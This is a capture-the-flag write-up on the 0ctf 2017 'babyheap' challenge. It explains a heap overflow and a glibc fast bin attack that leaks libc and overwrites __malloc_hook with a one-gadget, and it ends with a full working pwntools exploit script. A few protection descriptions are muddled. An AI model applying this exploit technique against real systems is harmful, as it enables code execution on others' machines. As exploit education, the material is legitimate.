---
layout: post
title: "Fast bin attack"
categories: [exploit, heap]
tags: [pwn]
---
Explanation of a heap exploit method, the fast bin duplicate attack. This post is based on the babyheap challenge from the 0ctf Quals 2017.

# Surroundings
Currently I learn the heap exploit using the [How2Heap](https://github.com/shellphish/how2heap) repository. Today I'm gonna tell you my interpretation of the fast bin attack using the [babyheap](https://github.com/ctfs/write-ups-2017/tree/master/0ctf-quals-2017/pwn/Baby-Heap-2017-255) challenge from the 0ctf quals 2017.

# Introduction
This challenge is provided with a binary and its LibC.

Let first begun by recovering some informations of our binary:

![Check_binary](/assets/media/fastbin_get_info.png)

From these commands output, we have the following informations:
- The binary is an ELF, compiled for x86_64 architecture ;
- It is dynamically linked ;
- It is stripped ;

The following protections are enabled:
- Full REad onLy RelOcation (We can't overwrite the GOT entry's) ;
- Stack smash protection (We must take care about the stack canary's) ;
- The stack is executable (We can't execute a shellcode on this memory segment) ;
- Position Independent Executable is enabled (We must leak address's if we want to use ROP) ;

Let's try to execute it now:

![First try](/assets/media/fastbin_run_binary.png)

It seems to be classic heap challenge. We can manage the heap using different command. The following commands are available:
- Allocate, which allocate a chunk (using calloc()) on the heap using a given size (less than 0x1000) and setup a structure with the given size and the allocated chunk, but the structure is not on the heap ;
- Fill, which fill a chunk at a given index using both a given size and content ;
- Free, which free a chunk at a given index, zeroed the chunk pointer and setup the chunk's structure to unused ;
- Dump, which dump the content of a chunk at a given index ;
- Exit, which exit the process ;

# Vulnerability
The vulnerability is located in the `Fill` command:

![Vulnerability](/assets/media/fastbin_allocate_vuln.png)

As you can see on the above image, the `fill` command ask for a size which is used to read a string of the given size using the `read_str` function in the given chunk. There is no boundary check, this allows an attacker to overflow the data located on the heap.

To exploit this heap overflow, I used the `fast bin attack` method.

The exploit plan is the following one:
- Leak the LibC using fast bins and small bin ;
- Tricking malloc() into returning the address of `__malloc_hook` ;
- Overwrite `__malloc_hook` with the address of a one gadget ;
- Trigger the hook using malloc()!

# Fast bin attack
The fast bin's array is located in the [malloc_state](https://code.woboq.org/userspace/glibc/malloc/malloc.c.html#malloc_state) structure. This array has a size of ten and each fast bin hold bins of the same size. (0x20, 0x30, 0x40, etc.) If you want more info about how fast bins work, check [here](https://heap-exploitation.dhavalkapil.com/).

The goal of this attack is to overwrite the data of a fast bin to trick malloc() into returning a nearly-arbitrary pointer.

ptmalloc2, the GlibC allocator got many updates seen it was implemented. Today it is a bit harder to exploit this technique due to the security check that have been added to malloc/free. To exploit our binary, we need to bypass the following check in malloc():

```c
size_t victim_idx = fastbin_index (chunksize (victim));
if (__builtin_expect (victim_idx != idx, 0))
  malloc_printerr ("malloc(): memory corruption (fast)");
check_remalloced_chunk (av, victim, nb);
```

In case malloc() found a fast bin which has the same size as the requested one, it checks if the size of the returned chunk is in the same `index` than the size given to malloc(). If both `index` are not equal, malloc will exit and print an error.

But if both size are in the same index, malloc() will return our arbitrary pointer!

# Leak LibC
The leak has been the hardest part for me. It took me a while to found a method to leak the LibC because of the followings:
- There are no dangling point, every pointer are zeroed when there are free ;
- When a chunk is allocated, the function used is calloc() so no Use After Free ;
- When we free a pointer, there is a check to know if the pointer is in use or not, so no double free ;

To start, I allocate several chunks. Below is a picture visualizing heap layout:

![heap_layout](/assets/media/fastbin_init_state.png)

The heap is composed of 4 fast bins which have a size of 0x20 with their header and 2 small bins which have a size of 0x90 with the header. The fifth first bins are used to leak the LibC and the last small bin is used to force free() to put the fifth chunk into the unsorted bin and so populated the forward pointer when we will free it. If this chunk is not present, free() will consolidate the freed chunk into the top chunk, as you can see below:
```c
else {
  size += nextsize;
  set_head(p, size | PREV_INUSE);
  av->top = p;
  check_chunk(av, p);
}
```

This cause free() not to populate the forward pointer.

The leak technique is in 6 parts:
- We first `free`, respectively, the third and second chunk to populate the forward pointer of the second chunk ;
- Then we use the heap overflow on the first chunk to overwrite the `Less Significant Byte` of the forward pointer of the `second chunk` with the value `0x80`, which is the LSB of the first small bin. The idea here is to trick malloc into returning the small bin chunk. Using this we will have two pointers which point to the same address ;
- If we try to malloc now, malloc will raise an error because of the chunk size condition we saw just before. So we need to edit the size of the first small bin in order to trick malloc. To do this, we will use another time our heap overflow on the fourth allocated chunk to edit the `mchunk_size` header field of the first small bin chunk with the value `0x21`.

After these steps, the heap layout look like below:

![fastbin_corrupted_size](/assets/media/fastbin_corrupted_size.png)

As you can see, the Less Significant Byte of the forward pointer of the second chunk has been overflowed by the one of the first small bin. The size of the first small bin has also been overflowed by the correct size of our fast bin, 0x20. Next step are the following:
- We allocate two chunks of size 0x20. The first one will have the address of the first freed chunk and the second one will have the address of the first small bin because of our previous trick. Thanks to this, we have two chunks which both point to the `same address` which is the first small bin chunk.
- Before being able to leak the LibC, we must set again the size of the first `small bin`, otherwise we will have an error when we free it. (Because we need to free it to populate the forward/backward pointer) So we will use one more time our heap overflow to set the first small bin size to its initialize size which was 0x90.
- Now its pretty easy to leak the LibC, we just have to free the first small bin, this will populate the forward/backward pointer of this bin with one of the LibC address's. Then we can dump the content of the second pointer which also point to the freed area but as this one is up, we can use it.

# Exploitation
Now that we defeat the ASLR, we just have to trick malloc into returning the `__malloc_hook` address's then overwrite it with our `one gadget` address's.

This exploit gonna be done in 6 steps:
- First we will allocate 4 fast bins which have a size of `0x70`. The size is very important, you will see why.
- Then we are going to free the last one and the one before it in that order.
- Now we will overflow the forward pointer of the second freed chunk using the allocated one before it with the address of the memory area we want malloc() to return. But we can't simply put the address's of the `__malloc_hook` because of the following:

```shell
gef➤  x/4gx 0x7ffff7dd3af0-16
0x7ffff7dd3ae0 <__memalign_hook>:	0x00007ffff7ab6420	0x00007ffff7ab63c0
0x7ffff7dd3af0 <__malloc_hook>:	0x0000000000000000	0x0000000000000000
```

The size `0x00007ffff7ab63c0` is not correct so, because of the size condition we saw before, malloc will raise an error as this size is not in the following range:
`0x70 < size < 0x7f`

But, above `__malloc_hook` there are these data's into the memory:
```shell
gef➤  x/8gx 0x7ffff7dd3af0-35
0x7ffff7dd3acd <_IO_wide_data_0+301>:	0xfff7dcff00000000	0x000000000000007f
0x7ffff7dd3add:	0xfff7ab6420000000	0xfff7ab63c000007f
0x7ffff7dd3aed <__realloc_hook+5>:	0x000000000000007f	0x0000000000000000
0x7ffff7dd3afd:	0x0100000000000000	0x0000000000000000
```

As the size 0x7f is in the above range, we can use the offset of the address `0x7ffff7dd3acd`. We will just have to take care of the padding between both addresses to being sure that we overwrote the good address's.

- Then we have to allocate two chunks in order to trick malloc into returning our arbitrary pointer. The arbitrary pointer will the one returned by the second malloc().
- Then we fill the returned arbitrary pointer with the address's of our one gadget.
- To finish we will allocate a chunk, this will call malloc but because of the below code from malloc():

```c
void *(*hook) (size_t, const void *)
  = atomic_forced_read (__malloc_hook);
if (__builtin_expect (hook != NULL, 0))
  return (*hook)(bytes, RETURN_ADDRESS (0));
```

As `__malloc_hook` is not NULL, malloc() will call our one gadget.

Here is my exploit:
```python
#!/usr/bin/env python2.7
# -*- coding: utf-8 -*-

from pwn import *
import os


context(arch="amd64", os="linux", endian="little")
#context.log_level="DEBUG"


class Pwn:
    def __init__(self):
        self.e = ELF("./babyheap")
        self.libc = ELF("/lib/x86_64-linux-gnu/libc-2.24.so")
        self.p = None

    def start_binary(self):
        self.p = process("./babyheap")
        self.p.recvuntil("Command: ")

    def allocate_cmd(self, size):
        self.p.sendline("1")
        self.p.recvuntil("Size: ")
        self.p.sendline(str(size))
        self.p.recvuntil("Command: ")

    def fill_cmd(self, index, size, content):
        self.p.sendline("2")
        self.p.recvuntil("Index: ")
        self.p.sendline(str(index))
        self.p.recvuntil("Size: ")
        self.p.sendline(str(size))
        self.p.recvuntil("Content: ")
        self.p.send(content)
        self.p.recvuntil("Command: ")

    def free_cmd(self, index):
        self.p.sendline("3")
        self.p.recvuntil("Index: ")
        self.p.sendline(str(index))
        self.p.recvuntil("Command: ")

    def dump_cmd(self, index):
        self.p.sendline("4")
        self.p.recvuntil("Index: ")
        self.p.sendline(str(index))
        return self.p.recvuntil("Command: ")

    def leak_libc(self):
        self.allocate_cmd(16)
        self.allocate_cmd(16)
        self.allocate_cmd(16)
        self.allocate_cmd(16)
        self.allocate_cmd(128)
        self.allocate_cmd(128)
        self.free_cmd(2)
        self.free_cmd(1)
        self.fill_cmd(0, 33, "\x00"*24+p64(0x21)+p8(0x80))
        self.fill_cmd(3, 32, "\x00"*24+p64(0x21))
        self.allocate_cmd(16)
        self.allocate_cmd(16)
        self.fill_cmd(3, 32, "\x00"*24+p64(0x91))
        self.free_cmd(4)
        data=self.dump_cmd(2)[10:]
        return u64(data[:6]+"\x00"*2)

    def rewrite_addr(self, src, dest):
        self.allocate_cmd(104)
        self.allocate_cmd(104)
        self.allocate_cmd(104)
        self.allocate_cmd(104)
        self.free_cmd(8)
        self.free_cmd(7)
        self.fill_cmd(6, 120, "\x00"*104+p64(0x70)+p64(src))
        self.allocate_cmd(104)
        self.allocate_cmd(104)
        self.fill_cmd(8, 27, "A"*19+p64(dest))
        self.p.sendline("1")
        self.p.recvuntil("Size: ")
        self.p.sendline(str(1337))
        self.p.interactive()
        self.p.close()

    def pwn_binary(self):
        self.start_binary()

        base_libc=self.leak_libc()-0x399b58
        log.info("Leak libc base address: "+hex(base_libc))

        self.rewrite_addr(base_libc+0x399acd, base_libc+0x3f35a)


def main():
    pwn = Pwn()
    pwn.pwn_binary()


if __name__ == "__main__":
    main()
```

# Demo
Let's test it:

![fastbin_demo](/assets/media/fastbin_test.png)

Done.

# References
- [https://sploitfun.wordpress.com/](https://sploitfun.wordpress.com/)
- [https://code.woboq.org/userspace/glibc/malloc/malloc.c.html](https://code.woboq.org/userspace/glibc/malloc/malloc.c.html)
- [https://heap-exploitation.dhavalkapil.com/diving_into_glibc_heap/](https://heap-exploitation.dhavalkapil.com/diving_into_glibc_heap/)
